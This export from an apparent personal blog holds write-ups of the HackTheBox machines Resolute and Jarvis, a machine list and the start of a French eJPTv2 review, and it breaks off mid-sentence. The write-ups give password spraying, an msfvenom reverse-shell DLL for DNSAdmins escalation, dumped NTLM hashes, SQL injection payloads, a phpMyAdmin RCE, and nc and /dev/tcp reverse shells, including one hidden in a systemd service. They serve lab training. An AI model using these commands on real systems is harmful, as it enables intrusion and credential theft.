megabank.local\\marcus SMB 10.10.10.169 445 RESOLUTE megabank.local\\sally SMB 10.10.10.169 445 RESOLUTE megabank.local\\fred SMB 10.10.10.169 445 RESOLUTE megabank.local\\angela SMB 10.10.10.169 445 RESOLUTE megabank.local\\felicia SMB 10.10.10.169 445 RESOLUTE megabank.local\\gustavo SMB 10.10.10.169 445 RESOLUTE megabank.local\\ulf SMB 10.10.10.169 445 RESOLUTE megabank.local\\stevie SMB 10.10.10.169 445 RESOLUTE megabank.local\\claire SMB 10.10.10.169 445 RESOLUTE megabank.local\\paulo SMB 10.10.10.169 445 RESOLUTE megabank.local\\steve SMB 10.10.10.169 445 RESOLUTE megabank.local\\annette SMB 10.10.10.169 445 RESOLUTE megabank.local\\annika SMB 10.10.10.169 445 RESOLUTE megabank.local\\per SMB 10.10.10.169 445 RESOLUTE megabank.local\\claude SMB 10.10.10.169 445 RESOLUTE megabank.local\\melanie SMB 10.10.10.169 445 RESOLUTE megabank.local\\zach SMB 10.10.10.169 445 RESOLUTE megabank.local\\simon SMB 10.10.10.169 445 RESOLUTE megabank.local\\naoki We get a potential password in the commentaire of the domain user marko, now we can create a liste of the users and try password spraying with all of it.\nmy user list :\nAdministrator Guest krbtgt DefaultAccount ryan marko sunita abigail marcus sally fred angela felicia gustavo ulf stevie claire paulo steve annette annika per claude melanie zach simon naoki Launch password spraying.\n\u0026gt; crackmapexec smb 10.10.10.169 -u user.lst -p pass.txt --continue-on-succes | grep \u0026#39;[+]\u0026#39; SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\melanie:Welcome123! We get user and password so it was the first acces on the domaine.\nFind the way using bloodhound : # collect ldap informations :\n\u0026gt; rusthound -d megabank.local -i 10.10.10.169 -u \u0026#34;melanie\u0026#34;@\u0026#39;megabank.local\u0026#39; -p \u0026#39;Welcome123!\u0026#39; as you can see melanie is part of group Remote Management users so we can open a shell with evil-winrm because this user is abel to administrate the DC with winrm remotly.\nconnect with winrm.\n\u0026gt; evil-winrm -i 10.10.10.169 -u \u0026#39;melanie\u0026#39; -p \u0026#39;Welcome123!\u0026#39; Get users .txt on the Desktop of melanie.\nAfter enumeration with bloodhound i found this way.\nand contractor is part of group DNSAdmins like you can see ( in this case i use ADpeas. )\nin my opinion we really need to compromise the DNSAdmin group to become Domain admin\nSecurity groups | The Hacker Recipes\nMelanie to Ryan : # After lot of enumeration I found this directory.\nAnd on this directory there is another directory and on these direcotry there is a file.\n\u0026gt; cd PSTranscripts \u0026gt; gci -Hidden Directory: C:\\PSTranscripts Mode LastWriteTime Length Name ---- ------------- ------ ---- d--h-- 12/3/2019 6:45 AM 20191203 \u0026gt; cd 20191203 \u0026gt; gci -Hidden Directory: C:\\PSTranscripts\\20191203 Mode LastWriteTime Length Name ---- ------------- ------ ---- -arh-- 12/3/2019 6:45 AM 3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt so download the file localy and lets analyse it localy.\nIts looks like a powershell command history and bimgo in this script we find the password of domain user ryan\nPS\u0026gt;CommandInvocation(Invoke-Expression): \u0026#34;Invoke-Expression\u0026#34; \u0026gt;\u0026gt; ParameterBinding(Invoke-Expression): name=\u0026#34;Command\u0026#34;; value=\u0026#34;cmd /c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123! if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }\u0026#34; \u0026gt;\u0026gt; CommandInvocation(Out-String): \u0026#34;Out-String\u0026#34; \u0026gt;\u0026gt; ParameterBinding(Out-String): name=\u0026#34;Stream\u0026#34;; value=\u0026#34;True\u0026#34; lets valid the credential with cme.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;ryan\u0026#39; -p \u0026#39;Serv3r4Admin4cc123!\u0026#39; SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\ryan:Serv3r4Admin4cc123! (admin) CME see ryan is admin, lets try to dump some hashes.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;ryan\u0026#39; -p \u0026#39;Serv3r4Admin4cc123!\u0026#39; --sam SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\ryan:Serv3r4Admin4cc123! (admin) SMB 10.10.10.169 445 RESOLUTE [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied but we can not do this, we need to exploit DNSadmin group.\nRyan to Domain Admin : # use evil-winrm to auth with ryan.\n\u0026gt; evil-winrm -i 10.10.10.169 -u \u0026#39;ryan\u0026#39; -p \u0026#39;Serv3r4Admin4cc123!\u0026#39; First we need to create a malicious DLL with msfvenom. that we will be injecting into a dns.exe process on a victim DNS server (DC).\nmsfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll LHOST=10.10.14.9 LPORT=1337 \u0026gt; dns.dll now use this command to tell to DC to load my dll when the service start.\n\u0026gt; dnscmd.exe RESOLUTE /config /serverlevelplugindll \\\\10.10.14.9\\share\\dns.dll If we have change succefully registry value ServerLevelPluginDll points to our malicious DLL :\n\u0026gt; Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll Now stop and restart the service to get the SYSTEM SHELL.\n# start listener \u0026gt; nc -lvp 1337 # start smbserver \u0026gt; impacket-smbserver share . # start and stop dns service \u0026gt; sc.exe stop dns \u0026gt; sc.exe start dns We get the shell, we can now add ryan to group administrators and dump domain hashes\n\u0026gt; net localgroup Administrators ryan /add dump hash.\n\u0026gt; secretsdump megabank.local/ryan:\u0026#39;Serv3r4Admin4cc123!\u0026#39;@10.10.10.169 Administrator:500:aad3b435b51404eeaad3b435b51404ee:fb3b106896cdaa8a08072775fbd9afe9::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:49a9276d51927d3cd34a8ac69ae39c40::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: megabank.local\\ryan:1105:aad3b435b51404eeaad3b435b51404ee:3f653cb103e005246bc95ceb2f56e30b::: megabank.local\\marko:1111:aad3b435b51404eeaad3b435b51404ee:8276510304cefe6e77c3a9e910ba3a6a::: megabank.local\\sunita:6601:aad3b435b51404eeaad3b435b51404ee:4e67de165ebd5e604d6580b15cfc61b2::: megabank.local\\abigail:6602:aad3b435b51404eeaad3b435b51404ee:3f67ccb851b02ac4ee9f91eeddf1cac7::: megabank.local\\marcus:6603:aad3b435b51404eeaad3b435b51404ee:d546df40747f48ece7e2be7349ec8f1b::: megabank.local\\sally:6604:aad3b435b51404eeaad3b435b51404ee:9d5a37664c09e08e8be59ca3e76c262f::: megabank.local\\fred:6605:aad3b435b51404eeaad3b435b51404ee:7be0fca1b4aec94356b86e4b1de06c4f::: megabank.local\\angela:6606:aad3b435b51404eeaad3b435b51404ee:07fe48603fa7ada83e62d14e54f45127::: megabank.local\\felicia:6607:aad3b435b51404eeaad3b435b51404ee:74dce6edc0eabd905d42e0a7225b80f3::: megabank.local\\gustavo:6608:aad3b435b51404eeaad3b435b51404ee:0b03061f9b79bf6642fe92aee0a109c6::: megabank.local\\ulf:6609:aad3b435b51404eeaad3b435b51404ee:f3dfd5c45de7a953c82fbe99749057c2::: megabank.local\\stevie:6610:aad3b435b51404eeaad3b435b51404ee:eb41b7464f302e573aaa697d191b5569::: megabank.local\\claire:6611:aad3b435b51404eeaad3b435b51404ee:72dc9d1d791307cf5217c8e39a88f56a::: megabank.local\\paulo:6612:aad3b435b51404eeaad3b435b51404ee:4e2d8cc79e15e601c099170a645483e6::: megabank.local\\steve:6613:aad3b435b51404eeaad3b435b51404ee:b8de802a1e7862c6e0e19be9c2baff0f::: megabank.local\\annette:6614:aad3b435b51404eeaad3b435b51404ee:2f9b8f25ec94dd46ecb071c27dc82905::: megabank.local\\annika:6615:aad3b435b51404eeaad3b435b51404ee:5d7226ebae151a224ada8add01bdc21c::: megabank.local\\per:6616:aad3b435b51404eeaad3b435b51404ee:b66616eb72209b81edded1fe63ae8806::: megabank.local\\claude:6617:aad3b435b51404eeaad3b435b51404ee:f059af81cb6022dc5de6389d4a6e6a65::: megabank.local\\melanie:10101:aad3b435b51404eeaad3b435b51404ee:e4a22d8e7bbec871b341c88c2e94cba2::: megabank.local\\zach:10102:aad3b435b51404eeaad3b435b51404ee:434927d08ddb971a8b14e407a58f6e9e::: megabank.local\\simon:10103:aad3b435b51404eeaad3b435b51404ee:25bc108c637a551f8b000054ea8ddc6e::: megabank.local\\naoki:10104:aad3b435b51404eeaad3b435b51404ee:07a1070c03b1a26e53d265d27ecb1a38::: RESOLUTE$:1000:aad3b435b51404eeaad3b435b51404ee:bd0c6f595fb4c21bab7d150c487183ed::: MS02$:1104:aad3b435b51404eeaad3b435b51404ee:7b71dcfa93cf1f5d37d34497b632c890::: connect with admin hash and get the flag.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;administrator\u0026#39; -H fb3b106896cdaa8a08072775fbd9afe9 -x \u0026#39;more C:\\Users\\Administrator\\Desktop\\root.txt\u0026#39; Credits : # Escalate to DA from DNSAdmins :\nEscalating Privileges with DNSAdmins Group — Active Directory\nmalicious dll with msfvenom :\nMeterpreter shell as a 32 \u0026amp; 64 Bit DLL\n","date":"17 March 2024","externalUrl":null,"permalink":"/posts/resolute/","section":"Posts","summary":"Resolute - OSCP boxe # Scanning : # Nmap scan to see open ports and services :","title":"OSCP boxe - Resolute"},{"content":" HacktheBox TJ nul list : # Voici ma liste perso de machines HTB pour préparer l\u0026rsquo;OSCP, bien sur inspiré de la trés connus TJ nulls lists.\nEasy Machines : # Sense - Linux https://app.hackthebox.com/machines/Sense Valentine - Linux https://app.hackthebox.com/machines/Valentine Networked - Linux https://app.hackthebox.com/machines/Networked Swag Shop - Linux https://app.hackthebox.com/machines/SwagShop BountyHunter - Linux https://app.hackthebox.com/machines/BountyHunter Irked - Linux https://app.hackthebox.com/machines/Irked Tabby - Linux https://app.hackthebox.com/machines/Tabby Optimum - Windows https://app.hackthebox.com/machines/Optimum Artic - Windows https://app.hackthebox.com/machines/Arctic Bounty - Windows https://app.hackthebox.com/machines/Bounty Jerry - Windows https://app.hackthebox.com/machines/Jerry Mirai - Linux https://app.hackthebox.com/machines/194 Medium Machines : # Jarvis - Linux https://app.hackthebox.com/machines/Jarvis Magic - Linux https://app.hackthebox.com/machines/Magic TarTarSauce - Linux https://app.hackthebox.com/machines/TartarSauce Node - Linux https://app.hackthebox.com/machines/Node Cronos - Linux https://app.hackthebox.com/machines/Cronos Bastrard - Windows https://app.hackthebox.com/machines/Bastard Silo - Windows https://app.hackthebox.com/machines/Silo Chatterbox - Windows https://app.hackthebox.com/machines/Chatterbox Resolute - Windows https://app.hackthebox.com/machines/Resolute Hard Machines : # Kotarak - Linux https://app.hackthebox.com/machines/Kotarak Tally - Windows https://app.hackthebox.com/machines/Tally Fafel - Linux https://app.hackthebox.com/machines/Falafel Conceal - Windows https://app.hackthebox.com/machines/Conceal Progress Status: # Easy Machines: 0% Medium Machines: 0% Hard Machines: 0%\n","date":"16 March 2024","externalUrl":null,"permalink":"/posts/my-first-post/","section":"Posts","summary":"HacktheBox TJ nul list : # Voici ma liste perso de machines HTB pour préparer l\u0026rsquo;OSCP, bien sur inspiré de la trés connus TJ nulls lists.","title":"TJ nulls List"},{"content":"","date":"11 March 2024","externalUrl":null,"permalink":"/tags/command-injection/","section":"Tags","summary":"","title":"Command Injection"},{"content":" Jarvis - OSCP boxe # Scanning : # Lets use nmap to see open ports and services behind the ports :\n\u0026gt; nmap -sV -sC -T4 -sS 10.10.10.143 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8💿c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Scan all ports :\n\u0026gt; nmap --max-retries 1 -n -T5 -Pn 10.10.10.143 22/tcp open ssh 80/tcp open http Enumeration : # Lets run gobuster to brute force the hidden directory of the web server.\n\u0026gt; gobuster dir -u http://10.10.10.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t50 /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.143/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.143/js/] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.143/images/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.143/fonts/] /phpmyadmin (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.143/phpmyadmin/] /sass (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.143/sass/] /server-status (Status: 403) [Size: 277] Lets use Whatweb to find some informations about the frontend and the backend of the web site.\n\u0026gt; whatweb -a 3 http://10.10.10.143 http://10.10.10.143 [200 OK] Apache[2.4.25], Bootstrap[3.3.5], Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[supersecurehotel@logger.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.143], JQuery, Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[Stark Hotel], UncommonHeaders[ironwaf], X-UA-Compatible[IE=edge] We found a domain and an email adress lets add the hostname to the /etc/hosts file.\necho \u0026#34;10.10.10.143 logger.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Whatweb have detected an Uncommon header ironwaf , maybe a waf is up on this web site lets try to detect what is it.\n\u0026gt; wafw00f http://10.10.10.143 ______ / \\ ( W00f! ) \\ ____/ ,, __ 404 Hack Not Found |`-.__ / / __ __ /\u0026#34; _/ /_/ \\ \\ / / *===* / \\ \\_/ / 405 Not Allowed / )__// \\ / /| / /---` 403 Forbidden \\\\/` \\ | / _ \\ `\\ /_\\\\_ 502 Bad Gateway / / \\ \\ 500 Internal Error `_____``-` /_/ \\_\\ ~ WAFW00F : v2.2.0 ~ The Web Application Firewall Fingerprinting Toolkit [*] Checking http://10.10.10.143 [+] Generic Detection results: [-] No WAF detected by the generic detection [~] Number of requests: 7 Exploiting SQLI : # I found this page with a parameter named cod.\nI try to put some sqli but that dosent works so i try with sqlmap.\n\u0026gt; sqlmap -u http://10.10.10.143/room.php?cod=* --level 5 --risk 3 the result of sqlmap is positive the cod parameter is vulnerable to sqli.\nsqlmap identified the following injection point(s) with a total of 264 HTTP(s) requests: --- Parameter: #1* (URI) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: http://10.10.10.143/room.php?cod=-4966 OR 4374=4374 Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 time-based blind - Parameter replace Payload: http://10.10.10.143/room.php?cod=(CASE WHEN (4223=4223) THEN SLEEP(5) ELSE 4223 END) Type: UNION query Title: Generic UNION query (random number) - 7 columns Payload: http://10.10.10.143/room.php?cod=-8998 UNION ALL SELECT 5730,5730,5730,CONCAT(0x7178707071,0x63667a7662754c637353594274754f62514a5358786a4f6b4f6c4a6b755155426547634a714a6a53,0x717a7a6271),5730,5730,5730-- - Lets try to exploit this vuln without sqlmap.\nI see that sqlmap tells us that we can make a sqli based on the union I try it because I’m really bad at sqli. So frist we need to found who many colomn have the table.\n\u0026gt; ?cod=13 UNION SELECT 1,2,3,4,5,6,7-- -+ We found the tables have 7 columns we can now for exemple dump the db version.\n\u0026gt; ?cod=13 UNION SELECT 1,2,3,4,@@version,6,7-- -+ Lets try to get informations about the databases.\n\u0026gt; ?cod=13 UNION SELECT 1,2,(select group_concat(schema_name)from INFORMATION_SCHEMA.SCHEMATA),4,5,6,7 -- -+ # or see the current database 13 UNION SELECT 1,2,3,4,database(),6,7-- -+ Lets get enumerate table in databases.\n\u0026gt; ?cod=13 UNION SELECT 1,2,table_name,4,table_schema,6,7 from INFORMATION_SCHEMA.TABLES order by 3-- -+ The account tables may contain some identification information, so let’s try to get information on it.\n\u0026gt; ?cod=13 UNION SELECT 1,2,(select group_concat(column_name)),4,5,6,7 from INFORMATION_SCHEMA.COLUMNS-- -+ But After lot of search it was not the right way. If I list my current user of the db I realize that I am dbadmin on the mysql service\n\u0026gt; ?cod=13 UNION SELECT 1,2,3,user(),5,6,7 -- - + Lets try to read some file to get LFI from sqli because i think my user have right to do.\n\u0026gt; ?cod=13 UNION SELECT 1,2,3,(LOAD_FILE(\u0026#34;/etc/passwd\u0026#34;)),5,6,7 -- - When I try to read php code the application return nothing, it is probably a code of certain tags in php code, tried to encode the output in b64 to get some result.\n\u0026gt; ?cod=13 UNION SELECT 1,2,3,(TO_base64(LOAD_FILE(\u0026#34;/var/www/html/room.php\u0026#34;))),5,6,7 -- -+ So a run a new gobuster brute force but this time I try to find some php file.\n\u0026gt; gobuster dir -u http://10.10.10.143 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t50 -x php /nav.php (Status: 200) [Size: 1333] /footer.php (Status: 200) [Size: 2237] /.php (Status: 403) [Size: 277] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.143/css/] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.143/images/] /index.php (Status: 200) [Size: 23628] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.143/js/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.143/fonts/] /phpmyadmin (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.143/phpmyadmin/] /connection.php (Status: 200) [Size: 0] /room.php (Status: 302) [Size: 3024] [--\u0026gt; index.php] /.php (Status: 403) [Size: 277] /sass (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.143/sass/] /server-status (Status: 403) [Size: 277] Lets try to get the php code of connection.php\n?cod=13 UNION SELECT 1,2,3,(TO_base64(LOAD_FILE(\u0026#34;/var/www/html/connection.php\u0026#34;))),5,6,7 -- -+ Decode the b64.\nPD9waHAKJGNvbm5lY3Rpb249bmV3IG15c3FsaSgnMTI3LjAuMC4xJywnREJhZG1pbicsJ2ltaXNz eW91JywnaG90ZWwnKTsKPz4K # decode form \u0026lt;?php $connection=new mysqli(\u0026#39;127.0.0.1\u0026#39;,\u0026#39;DBadmin\u0026#39;,\u0026#39;imissyou\u0026#39;,\u0026#39;hotel\u0026#39;);?\u0026gt; With this credential we log in to phpmyadmin page.\nGet RCE on PhpMyAdmin : # After a quick search I find the version a phpmyadmin it is 4.8.0 so I search some know vulnerabilities on this version and I found this exploit db exploit.\nphpMyAdmin 4.8.1 - Remote Code Execution (RCE)\nSo download it using searchsploit.\n\u0026gt; searchsploit -m 50457.py Launch the exploit and get RCE.\n\u0026gt; python 50457.py 10.10.10.143 80 /phpmyadmin DBadmin imissyou id uid=33(www-data) gid=33(www-data) groups=33(www-data) Get reverse shell.\n\u0026gt; python 50457.py 10.10.10.143 80 /phpmyadmin DBadmin imissyou \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2\u0026gt;\u0026amp;1|nc 10.10.14.9 1234 \u0026gt;/tmp/f\u0026#39; Privileges Escalation www-data ⇒ pepper : # I run a linpeas on the target and i find this priv esc way.\nThe binary systemctl is configured to suid we can easly exploit this but we do not have the right to execute this binary.\n\u0026gt; ls -l /bin/systemctl -rwsr-x--- 1 root pepper 174520 Jun 29 2022 /bin/systemctl Enumerate sudo right of the user.\n\u0026gt; sudo -l User www-data may run the following commands on jarvis: (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py lets see what is this python script. On this on fonction is interresting.\ndef exec_ping(): forbidden = [\u0026#39;\u0026amp;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;||\u0026#39;, \u0026#39;|\u0026#39;] command = input(\u0026#39;Enter an IP: \u0026#39;) for i in forbidden: if i in command: print(\u0026#39;Got you\u0026#39;) exit() os.system(\u0026#39;ping \u0026#39; + command) As you can see this fonction take an input from the user, it attents an ip, to try to secure the thing the creator has added a filter that will browse the string send to user if the one if contains separators commands bash then we do not pass the filter.\nI try to find some payload and cheat sheet.\nHacker\u0026rsquo;s Guide\nIn this cheat sheet I see that it is possible to force a command execution with the following syntax $(command) .\n\u0026gt; sudo -u pepper /var/www/Admin-Utilities/simpler.py -p Enter an IP: $(id) #result ping: groups=1000(pepper): Temporary failure in name resolution This work we get the output succefully, now get reverse shell.\n#Create a file with bash reverse shell payload #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.9/4444 0\u0026gt;\u0026amp;1 # give it the exec right \u0026gt; chmod +x shell.sh # launch rce \u0026gt; sudo -u pepper /var/www/Admin-Utilities/simpler.py -p Enter an IP: $(bash /tmp/shell.sh) We can now exploit the SUID binary systemctl is real simple, to start create a file named shell.service.\ntouch shell.service # paste that in there, juste change the ip adresse [Unit] Description=roooooooooot [Service] Type=simple User=root ExecStart=/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.9/9999 0\u0026gt;\u0026amp;1\u0026#39; [Install] WantedBy=multi-user.target Uplaod this file on the target on the /home/pepper directory and enable the new malicious service.\n\u0026gt; /bin/systemctl enable /home/pepper/shell.service Now start the service do not forget to your nc listener.\n\u0026gt; nc -lnvp 9999 # start malicious service \u0026gt; /bin/systemctl start shell GG ! Realy nice boxe i love exploit SQLI and understand what I\u0026rsquo;m doing 😆.\n","date":"11 March 2024","externalUrl":null,"permalink":"/posts/jarvis/","section":"Posts","summary":"Jarvis - OSCP boxe # Scanning : # Lets use nmap to see open ports and services behind the ports :","title":"OSCP boxe - Jarvis"},{"content":"","date":"11 March 2024","externalUrl":null,"permalink":"/tags/sqli/","section":"Tags","summary":"","title":"SQLI"},{"content":" eJPTv2 Review FR # cette review est en quatre parties # Les cours et le PATH\nComment préparer l\u0026rsquo;exam hors cours de l\u0026rsquo;INE\nL\u0026rsquo;examen\nCe qui manque à la certification\nLes cours et Le PATH # Après votre paiement, vous obtiendrez l\u0026rsquo;acces au PATH \u0026lsquo;Penetration Tester student\u0026rsquo; de l\u0026rsquo;INE. Les cours sont dirigés par Josh Mason, mais principalement enseignés par Alexi Hamed, également connu sous le nom de @Hackersploit. Le parcours dure 148 heures et est très complet. Vous aborderez tous les aspects fondamentaux du pentesting à travers des vidéos explicatives, suivies de travaux pratiques dans un laboratoire pour mettre en pratique ce que vous venez d\u0026rsquo;apprendre. Vous disposerez d\u0026rsquo;un fichier PDF pour chaque laboratoire, afin de prendre des notes. Personnellement, j\u0026rsquo;ai enregistré toutes mes notes dans une base de données personnelle, car c\u0026rsquo;est ma méthode de travail. Je recommande l\u0026rsquo;utilisation de l\u0026rsquo;outil Notion pour ce type de prise de notes.\nComme mentionné précédemment, le contenu des cours est très complet. Vous commencerez par une section sur les technologies d\u0026rsquo;évaluation, qui, pour être honnete n\u0026rsquo;a pas été faite en entier. Le module sur la « Information Gathering » est particulièrement intéressant, car il traite de toutes les méthodes de recherche sur des sources ouvertes pour obtenir des informations sur votre cible via internet (animé par Hackersploit).\nLa section la plus captivante est la troisième, intitulée «Host \u0026amp; Network Penetration Testing». Cette section à elle seule pourrait suffire pour réussir l\u0026rsquo;examen. Vous y apprendrez à comprendre et à utiliser le framework Metasploit, qui occupe une place centrale dans cette certification. Vous passerez en revue tous les aspects d\u0026rsquo;un test de pénétration, notamment le scan actif via nmap et ses divers scripts (NSE), l\u0026rsquo;énumération des services réseau tels que smb, ssh, ftp, rdp, mysql, apache, smtp, et j\u0026rsquo;en oublie sûrement. Vous apprendrez ensuite comment exploiter ces vulnérabilités pour accéder à une machine ou à un serveur après les avoir identifiées. Dans la même veine, il y a une section consacrée à la post-exploitation, qui inclut l\u0026rsquo;énumération et les élévations de privilèges sous Linux et Windows, diverses techniques de persistance, du pivotage avec Meterpreter, ainsi qu\u0026rsquo;une petite partie sur l\u0026rsquo;effacement des traces. Vous serez également initié à des attaques telles que l\u0026rsquo;empoisonnement ARP et les attaques WiFi. En ce qui concerne l\u0026rsquo;exploitation web, le parcours part vraiment de zéro, alors prenez des notes détaillées sur les attaques par force brute sur les formulaires de connexion http-post avec l\u0026rsquo;outil Hydra, car cela peut s\u0026rsquo;avérer utile lors de l\u0026rsquo;examen. En réalité, cette certification ne se penche que très rarement, voire jamais, sur l\u0026rsquo;exploitation manuelle des vulnérabilités, ce qui est dommage, car parfois, vous pouvez exploiter une vulnérabilité sans vraiment comprendre pourquoi vous avez obtenu une exécution de code à distance (RCE).\nEn ce qui concerne la difficulté des cours, ils restent au niveau très basique du pentesting. Cependant, je recommande tout de même d\u0026rsquo;avoir une connaissance préalable de l\u0026rsquo;utilisation du terminal, de l\u0026rsquo;environnement Linux et des bases solides en réseautique. Avant de suivre cette certification, j\u0026rsquo;avais travaillé sur TryHackMe, en particulier le parcours Junior Penetration Tester. Je ne peux que vous conseiller de faire ce parcours au préalable.\nLa majeure partie des cours est dispensée par Hackersploit, et c\u0026rsquo;est vraiment un plaisir de suivre ses enseignements. Personnellement, j\u0026rsquo;ai des difficultés avec l\u0026rsquo;anglais, surtout lorsque les gens parlent rapidement. J\u0026rsquo;avais donc un peu peur de manquer des informations, mais Hackersploit parle anglais de manière posée, ce qui m\u0026rsquo;a beaucoup aidé. Grâce à lui, j\u0026rsquo;ai même progressé en anglais. Pour vous donner une idée, j\u0026rsquo;ai commencé à regarder les vidéos avec des sous-titres en anglais, mais vers le milieu du parcours, je n\u0026rsquo;en avais plus besoin, tant le niveau d\u0026rsquo;anglais de Hackersploit est agréable. En ce qui concerne les explications techniques, elles sont également très claires. Hackersploit explique tout ce qu\u0026rsquo;il fait et ne va pas trop vite.\nPréparation Complémentaire avec CTF et Machines Pratiques # Je suis convaincu que les cours fournissent une base solide pour l\u0026rsquo;examen, cependant, pour renforcer mes compétences, j\u0026rsquo;ai choisi d\u0026rsquo;aller au-delà et de m\u0026rsquo;engager dans divers CTF en parallèle avec le parcours. Cette approche a grandement contribué à ma réussite à l\u0026rsquo;examen. Je m\u0026rsquo;étais déjà intéressé aux CTF avant de commencer la certification. Étant donné le manque d\u0026rsquo;accent mis sur l\u0026rsquo;exploitation manuelle dans le parcours, j\u0026rsquo;ai consacré beaucoup de temps à relever des défis sur RootMe. Cela m\u0026rsquo;a poussé à exploiter des vulnérabilités de manière manuelle et à mettre en pratique le principe « Lisez le foutu manuel ».\nPendant la dernière semaine précédant l\u0026rsquo;examen, j\u0026rsquo;ai concentré mes efforts sur les challenges Boot2Root de TryHackMe et HackTheBox. Cela a été rendu possible grâce à l\u0026rsquo;accès gratuit temporaire à des machines retirées, qui s\u0026rsquo;est avéré très enrichissant. Je recommande de résoudre les machines suivantes avant l\u0026rsquo;examen :\nTryHackMe : # Basic Pentesting Relevant Daily Bugle Ice Blue Skynet Tomghost Brute It GamingServer Anonymous Blog 0day Alfred Steel Mountain Hackparc HackTheBox : # Timelapse Devel MonitorsTwo Pilgrimage VulnHub : # DerpNstink Stapler 1 My Web Server Expérience de l\u0026rsquo;Examen de Certification # L\u0026rsquo;environnement de l\u0026rsquo;examen est basé sur Guacamole. Mon environnement était stable, mais il y a des contraintes à considérer. Par exemple, j\u0026rsquo;ai voulu me connecter à un serveur via Evil-WinRM, mais l\u0026rsquo;outil n\u0026rsquo;était pas installé et l\u0026rsquo;environnement n\u0026rsquo;est pas connecté à Internet, ce qui signifie qu\u0026rsquo;il n\u0026rsquo;y avait pas de possibilité d\u0026rsquo;installer de paquets. Le manque d\u0026rsquo;accès VPN pour utiliser nos propres machines d\u0026rsquo;attaque a été une restriction, ce qui est dommage. J\u0026rsquo;ai ressenti des limitations dans mes choix d\u0026rsquo;attaques. Vous avez une marge de temps confortable, car vous disposez de 48 heures pour répondre aux questions, qui parfois vous aident à progresser dans le laboratoire.\nLe contexte de l\u0026rsquo;examen est le suivant : vous vous trouvez dans une DMZ avec plusieurs hôtes à l\u0026rsquo;intérieur. Vous devez trouver un moyen d\u0026rsquo;accéder à plusieurs d\u0026rsquo;entre eux (dans mon cas, il s\u0026rsquo;agissait de 4 serveurs, dont 3 Windows et 1 Linux). En utilisant l\u0026rsquo;un de ces serveurs, vous devez établir une connexion avec Meterpreter pour pivoter sur un réseau interne (dans mon cas, un réseau Linux).\nEn vérité, la plupart des éléments de l\u0026rsquo;examen auraient pu être réalisés avec Metasploit, du moins une grande partie. Cependant, ce n\u0026rsquo;est pas toujours avantageux, car certains modules de Metasploit peuvent échouer, et vous ne pouvez pas toujours compter sur des preuves de concept depuis GitHub comme vous le feriez habituellement. Vous devez être capable de faire fonctionner vos modules. De plus, le fait de ne pas pouvoir copier-coller entre votre ordinateur hôte et l\u0026rsquo;environnement Guacamole ajoute une complexité. En ce qui concerne les vulnérabilités, la plupart d\u0026rsquo;entre elles étaient couvertes dans les cours, mais certaines ne l\u0026rsquo;étaient pas. C\u0026rsquo;est ici que l\u0026rsquo;expérience acquise lors des CTF m\u0026rsquo;a été d\u0026rsquo;une grande aide, car j\u0026rsquo;ai pu exploiter des vulnérabilités que je n\u0026rsquo;avais pas vues 